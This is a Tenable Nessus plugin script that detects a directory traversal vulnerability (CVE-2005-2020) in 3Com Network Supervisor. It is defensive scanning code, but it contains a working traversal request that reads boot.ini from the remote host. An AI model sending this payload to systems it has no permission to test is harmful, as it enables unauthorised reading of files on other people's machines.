#
# (C) Tenable Network Security
#


if (description) {
  script_id(19939);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-2020");
  script_bugtraq_id(14715);

  name["english"] = "3Com Network Supervisor Directory Traversal Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

It is possible to retrieve arbitrary files on the remote host.

Description :

The remote host is running 3Com Network Supervisor, a network
monitoring application. 

The version of 3Com Network Supervisor installed on the remote host is
prone to a directory traversal vulnerability and, as such, allows an
unauthenticated attacker to read arbitrary files on the same filesystem 
as the application.

See also :

http://www.idefense.com/application/poi/display?id=300&type=vulnerabilities

Solution :

Apply the appropriate Critical Update 1 from 3Com.

Risk factor :

Medium / CVSS Base Score : 5 
(AV:R/AC:L/Au:NR/C:C/A:N/I:N/B:C)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for directory traversal vulnerability in 3Com Network Supervisor";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 21700);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:21700);
if (!get_port_state(port)) exit(0);


# If the banner indicates it's 3Com's product...
banner = get_http_banner(port:port);
if (banner && "Server: 3NS Report Command Server" >< banner) {
  # Try to exploit the flaw to read 'boot.ini'.
  req = http_get(
    item:string("/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini"), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if it looks like the file.
  if ("[boot loader]" >< res) {
    security_warning(port);
  }
}
